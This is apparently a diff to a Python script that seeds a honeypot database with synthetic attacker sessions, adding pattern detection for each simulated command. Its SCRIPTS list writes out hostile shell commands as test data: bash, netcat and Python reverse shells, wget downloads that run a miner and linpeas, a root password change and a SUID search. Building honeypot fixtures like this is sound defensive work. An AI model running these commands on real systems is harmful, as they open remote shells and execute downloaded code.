@@ -3,6 +3,7 @@ import json
 import random
 import time
 
+from . import patterns
 from .store import Store
 
 CREDS = [
@@ -19,6 +20,10 @@ SCRIPTS = [
     ["cd /tmp; wget http://{ip}/.xmr; chmod +x .xmr; ./.xmr", "crontab -l", "ps"],
     ["echo root:Pw0rned | chpasswd", "ls -la ~/.ssh", "history"],
     ["uname -a"],
+    ["bash -i >& /dev/tcp/{ip}/4444 0>&1"],
+    ["id", "nc -e /bin/sh {ip} 9001"],
+    ["sudo -l", "find / -perm -4000 2>/dev/null", "cd /tmp; wget http://{ip}/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh"],
+    ["whoami", "python3 -c 'import socket,os;s=socket.socket();s.connect((\"{ip}\",4444));os.dup2(s.fileno(),0)'"],
     ["ifconfig", "df -h", "uptime", "w"],
 ]
 NETS = ["203.0.113", "198.51.100", "192.0.2"]
@@ -65,6 +70,8 @@ def seed(db_path, sessions=420, hours=48, seed_value=13):
         for line in rng.choice(SCRIPTS):
             line = line.format(ip=payload_ip)
             ev("command", {"cmd": line})
+            for kind, data in patterns.detect(line):
+                ev(kind, data)
             if "http://" in line:
                 url = line.split("http://")[1].split()[0].split(";")[0].split("|")[0].strip()
                 ev("url", {"url": "http://" + url, "cmd": line})
